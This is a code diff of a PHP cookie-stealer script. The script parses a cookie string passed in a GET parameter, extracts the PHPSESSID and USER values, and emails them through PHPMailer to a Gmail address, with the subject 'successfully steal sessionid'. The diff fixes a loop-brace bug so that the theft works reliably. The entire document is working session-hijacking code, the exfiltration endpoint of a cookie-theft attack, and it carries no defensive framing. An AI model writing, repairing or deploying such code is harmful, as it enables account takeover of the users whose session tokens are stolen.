@@ -8,11 +8,13 @@ if (isset($_GET["abc"])) {
     $user = "";
     $arr = explode(";", $cookie);
     $arrlength = count($arr);
-    for ($x = 0; $x < $arrlength; $x++)
+    for ($x = 0; $x < $arrlength; $x++){
         if (strpos($arr[$x], "PHPSESSID"))
             $sessionid = explode("=", $arr[$x])[1];
         if (strpos($arr[$x], "USER"))
             $user = explode("=", $arr[$x])[1];
+    }
+        
 
 
     $mail = new PHPMailer();
@@ -29,7 +31,7 @@ if (isset($_GET["abc"])) {
     $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
     $mail->Subject = 'successfully steal sessionid';
-    $mail->MsgHTML("sessionid : ".$sessionid."user : ".$user);
+    $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
     
     $mail->Send();
